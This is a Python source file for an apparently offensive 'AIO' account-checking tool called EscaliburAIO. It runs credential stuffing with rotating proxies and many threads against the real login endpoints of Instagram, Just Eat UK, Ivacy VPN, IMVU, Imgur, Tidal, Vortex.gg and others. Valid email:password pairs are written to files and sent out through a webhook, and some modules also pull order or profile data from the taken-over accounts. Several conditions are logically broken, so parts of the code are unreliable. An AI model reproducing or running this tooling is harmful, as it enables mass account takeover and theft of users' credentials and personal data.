                        open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    else:
                        open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "invalid_credentials" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=lol_na_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=lol_na_check, args=(emails, passwords, proxylist,)).start()
    def lol_na():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="LoL-NA"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=lol_na_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def just_eat_uk_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://public.je-apis.com/identity/connect/token" 

                content = f"scope=openid%20mobile_scope%20offline_access&grant_type=password&username={email}&password={password}&acr_values=tenant%3AUK%20device%3AeyJEZXZpY2VUeXBlIjoiQW5kcm9pZCIsIkRldmljZU5hbWUiOiJTTS1HOTI1RiIsIkRldmljZUlkIjoiNzA2N2ZjYzQtMWEwYS00MGRmLWIzZTAtNWE2Zjk5YjlkOWY4In0%3D"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C)", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "ADRUM_1":"isMobile:true", 
                    "ADRUM":"isAjax:true", 
                    "Authorization":"Basic bW9iaWxlX25hdGl2ZTo0NTQ1ZjQ5Yy1mY2U0LTRlYWQtODUxNC1lYzRmODU2MDliNWI=" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "{\"access_token\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    token = search(r'{\"access_token\":\"(.*?)\",\"expires_in', str(r.text)).group(1)
                    url = "https://public.je-apis.com/consumer/me/orders?pagination="
                    headers = {
                        "User-Agent":"[JUST-EAT-APP/6.3.0.73532/Android - SM-G925F - 5.1.1 (API 22)]", 
                        "Pragma":"no-cache" ,
                        "Accept":"*/*" ,
                        "Accept-Version":"2018-09" ,
                        "Requires-Bearer-Auth":"true" ,
                        "Accept-Language":"en-GB" ,
                        "Accept-Charset":"utf-8" ,
                        "Accept-Tenant":"UK" ,
                        "Application-Id":"4" ,
                        "Application-Version":"6.3.0.73532" ,
                        "Authorization":f"Bearer {token}" ,
                        "ADRUM_1":"isMobile:true" ,
                        "ADRUM":"isAjax:true" 
                    }
                    f = sess.get(url, headers=headers)
                    orderplaced = search(r'createdAt\":\"(.*?)\",\"canReorder', str(f.text)).group(1)
                    price = search(r'totalPaid\":(.*?)},\"payments', str(f.text)).group(1)
                    open("results/{}/good.txt".format(today), "a+").write("{}:{} | OrderPlaced: {} | Price: {} |\n".format(email, password, orderplaced, price))
                elif "description\":\"username or password does not match" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=just_eat_uk_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=just_eat_uk_check, args=(emails, passwords, proxylist,)).start()
    def just_eat_uk():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="JustEat UK"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=just_eat_uk_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def ivacy_vpn_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://apiv2.ivacy.com/login"

                content = f"sSignature=46a6c3206554b6415a3345f06ca492ef&sLocale=en&sDeviceType=android&sAppType=Premium&sPassword={password}&sDateTime=2019-02-23%2006%3A53%3A35&sDeviceId=4222343544328945&sEmail={email}&sDeviceToken="

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"", 
                    "User-Agent":"okhttp/3.9.0", 
                    "Pragma":"no-cache" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "{\"header\":{\"code\":3,\"message\":\"Email or Password was incorrect.\"},\"body\":{}}" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "\"message\":\"Authentication successful\"" or "\"iIsPremium\":0" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Please enable cookies." in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "\"message\":\"Authentication successful\"" or "iIsPremium\":1" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=ivacy_vpn_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=ivacy_vpn_check, args=(emails, passwords, proxylist,)).start()
    def ivacy_vpn():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="IvacyVPN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=ivacy_vpn_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1


    def instagram_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.instagram.com/accounts/login/ajax/"

                content = f"username={email}&password={password}&queryParams=%7B%7D&optIntoOneTap=false" 

                headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "scheme":"https", 
                "accept":"*/*", 
                "accept-encoding":"gzip, deflate, br", 
                "accept-language":"el-GR,el;q=0.9,en;q=0.8", 
                "content-length":"70", 
                "origin":"https://www.instagram.com", 
                "referer":"https://www.instagram.com/", 
                "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36", 
                "x-csrftoken":"zhyfnT8y6gosM0V0AeVYG3j4QChtrNzs", 
                "x-ig-app-id":"936619743392459", 
                "x-instagram-ajax":"ceefc659ad3e", 
                "x-requested-with":"XMLHttpRequest"
                }

                r = sess.post(url, data=content, headers=headers)

                if "{\"authenticated\": true"  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "{\"authenticated\": false" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=instagram_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=instagram_check, args=(emails, passwords, proxylist,)).start()
    def instagram():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Instagram"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=instagram_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def imvu_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://api.imvu.com/login"

                content = {"username":email,"password":password}

                headers = {
                    "Content-Type":"application/json; charset=utf-8", 
                    "User-Agent":"IMVU-Android/4.10.2.41002008 (samsung SM-A520F; Android v.5.1.1 API 22)", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, json=content, headers=headers)
                if "\"status\":\"success\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "\"status\":\"failure\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=imvu_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=imvu_check, args=(emails, passwords, proxylist,)).start()
    def imvu():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Imvu"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=imvu_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def imgur_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://imgur.com/signin?redirect=https%3A%2F%2Fimgur.com%2F"

                content = f"username={email}&password={password}&remember=remember&submit=&_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", 
                    "Upgrade-Insecure-Requests":"1" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Your login information was incorrect." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/ban.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                        "Pragma":"no-cache", 
                        "Accept":"*/*" 
                    }
                    f = sess.get("https://imgur.com/account/settings", headers=headers)
                    if ">sign out<" in f.text:
                        banned+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                        webhook("{}:{}".format(email, password))
                        username2 = search(r'<input id=\"url\" type=\"text\" tabindex=\"1\" name=\"url\" minlength=\"4\" maxlength=\"64\" ualphanumeric=\"true\" class=\"required\" value=\"(.*?)\"', str(f.text)).group(1)
                        created = search(r'<div><strong>(.*?)</strong></div>', str(f.text)).group(1)
                        open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Username: {} | Created: {} |\n".format(email, password, username2, created))
                    else:
                        threading.Thread(target=imgur_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=imgur_check, args=(emails, passwords, proxylist,)).start()
    def imgur():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Imgur"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=imgur_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def imeipro_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "http://www.imeipro.info/j_spring_security_check" 

                content = f"j_username={email}&j_password={password}&submit=Submit"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "You logged in successfully" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Invalid Username or Password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=imeipro_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=imeipro_check, args=(emails, passwords, proxylist,)).start()
    def imeipro():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ImeiPRO"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=imeipro_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def vortex_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://vortex.gg/account/signin"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://vortex.gg/" 
                }
                content = ""
                f = sess.get(url, headers=headers, data=content, allow_redirects=True)
                token = search(r'RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\"', str(f.text)).group(1)

                url = "https://vortex.gg/account/signin"

                content = f"Username={email}&Password={password}&RememberMe=false&__RequestVerificationToken={token}"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://vortex.gg/account/signin", 
                    "origin":"https://vortex.gg" 
                }

                r = sess.post(url, data=content, headers=headers, allow_redirects=True)
                if "The password is incorrect" or "The account does not exist" or "Please enter a valid email address."  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Profile" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "https://vortex.gg/account/profile"
                    content = ""
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded", 
                        "Accept":"*/*", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                        "Pragma":"no-cache" 
                    }
                    r = sess.post(url, data=content, headers=headers)
                    if "Subscribe and play" in r.text:
                        open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    else:
                        open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=vortex_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=vortex_check, args=(emails, passwords, proxylist,)).start()
    def vortex():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Vortex.gg"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=vortex_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def tidal_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                content = f"username={username}&password={password}&token=kgsOOmYk3zShYrNP&clientUniqueKey=0023efc429a34444&clientVersion=1.16.7"
                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"TIDAL_ANDROID/709 okhttp/3.3.1", 
                    "Pragma":"no-cache" 
                }

                r = sess.post("https://api.tidal.com/v1/login/username", data=content, headers=headers, allow_redirects=True)

                if "userId" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Username or password is wrong" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=tidal_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=tidal_check, args=(emails, passwords, proxylist,)).start()
    def tidal():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Tidal"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=tidal_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def skillshare_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.reddit.com/login/"

                content = {"email":email,"password":password}

                headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache" 
                }
                r = sess.post(url, headers=headers, json=content)
                if "Basic Member" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif r.status_code == "400":
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Premium Member" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=skillshare_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=skillshare_check, args=(emails, passwords, proxylist,)).start()
    def skillshare():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
